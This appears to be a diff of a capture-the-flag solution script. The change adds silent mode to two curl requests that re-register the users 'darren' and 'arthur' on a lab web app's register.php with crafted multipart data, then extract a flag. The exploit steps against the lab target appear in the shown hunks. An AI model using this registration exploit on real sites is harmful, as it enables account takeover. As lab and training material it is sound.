@@ -19,7 +19,7 @@ echo "--> Session initiated : $PHPSESSID"
 
 # Registering darren a second time --- CAUTION : The boundary in the file is the one Content-Type plus 2 entry -- !!!
 echo "2 - REGISTERING DARREN"
-curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L -H "Content-Type: multipart/form-data; boundary=--------------------------346104398912025331583998084524" --data-binary @${scriptpath}/7-data/darren.txt > /dev/null
+curl -s -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L -H "Content-Type: multipart/form-data; boundary=--------------------------346104398912025331583998084524" --data-binary @${scriptpath}/7-data/darren.txt > /dev/null
 
 # Logging as adrren
 echo "3 - ANALYZING DARREN"
@@ -28,7 +28,7 @@ echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/7-
 
 # Registering arthur a second time
 echo "4 - REGISTERING ARTHUR"
-curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L -H "Content-Type: multipart/form-data; boundary=--------------------------346104398912025331583998084524" --data-binary @${scriptpath}/7-data/arthur.txt > /dev/null
+curl -s -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L -H "Content-Type: multipart/form-data; boundary=--------------------------346104398912025331583998084524" --data-binary @${scriptpath}/7-data/arthur.txt > /dev/null
 
 # Logging as arthur
 echo "5 - ANALYZING ARTHUR"
